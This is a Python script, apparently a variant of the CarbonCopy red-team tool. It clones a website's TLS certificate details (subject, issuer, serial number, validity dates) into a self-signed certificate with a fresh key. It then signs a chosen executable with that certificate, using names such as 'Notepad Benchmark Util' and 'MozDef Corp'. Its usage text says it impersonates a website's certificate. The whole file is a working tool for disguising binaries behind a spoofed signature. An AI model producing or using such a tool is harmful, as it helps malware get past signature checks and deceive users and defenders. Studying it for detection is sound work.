#!/usr/bin/python3

from OpenSSL import crypto
from sys import argv, platform
from pathlib import Path
import shutil
import ssl
import os
import subprocess
import traceback

TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"

def print_verbose(message):
    if VERBOSE:
        print(message)

def check_osslsigncode():
    try:
        oslsigncode_version = subprocess.check_output(["osslsigncode", "--version"], text=True)
        print_verbose("[+] Using osslsigncode version:", oslsigncode_version.strip())
        return True
    except FileNotFoundError:
        print_verbose("[X] osslsigncode not found. Please ensure it's installed and in the PATH.")
        return False

def sign_executable_with_osslsigncode(pfxfile, signee, signed):
    try:
        args = [
            "osslsigncode", "sign",
            "-pkcs12", pfxfile,
            "-n", "Notepad Benchmark Util",
            "-i", TIMESTAMP_URL,
            "-in", signee,
            "-out", signed
        ]
        subprocess.check_call(args)
        print_verbose("[+] Signing with osslsigncode completed successfully.")
    except subprocess.CalledProcessError as ex:
        print_verbose("[X] Failed to sign with osslsigncode:", ex)
        traceback.print_exc()

def CarbonCopy(host, port, signee, signed):
    try:
        print("[+] Loading public key of %s in Memory..." % host)
        ogcert = ssl.get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        cert.set_version(x509.get_version())
        cert.set_serial_number(x509.get_serial_number())
        cert.set_subject(x509.get_subject())
        cert.set_issuer(x509.get_issuer())
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        CNCRT = certDir / (host + ".crt")
        CNKEY = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")

        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        pfx = crypto.PKCS12()
        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()
        PFXFILE.write_bytes(pfxdata)

        if platform == "win32":
            print("[+] Platform is Windows OS...")
            print("[+] Signing %s with signtool.exe..." % signed)
            shutil.copy(signee, signed)
            subprocess.check_call(["signtool.exe", "sign", "/v", "/f", PFXFILE,
                                   "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
                                   "/td", "SHA256", "/fd", "SHA256", signed])
        else:
            print("[+] Platform is Linux OS...")
            print("[+] Signing %s with osslsigncode..." % signee)
            if check_osslsigncode():
                sign_executable_with_osslsigncode(PFXFILE, signee, signed)
    except Exception as ex:
        print("[X] Something Went Wrong!")
        print("[X] Exception:", ex)
        traceback.print_exc()

def main():
    global VERBOSE
    VERBOSE = True  # Set to False to suppress verbose output

    print(""" +-+-+-+-+-+-+-+-+-+-+-+-+
 |C|a|r|b|o|n|S|i|g|n|e|r|
 +-+-+-+-+-+-+-+-+-+-+-+-+

  CarbonSigner v1.0\n  Author: Paranoid Ninja\n""")
    if len(argv) != 5:
        print("[+] Descr: Impersonates the Certificate of a website\n[!] Usage: " + argv[0] + " <hostname> <port> <build-executable> <signed-executable>\n")
    else:
        CarbonCopy(argv[1], argv[2], argv[3], argv[4])

if __name__ == "__main__":
    main()
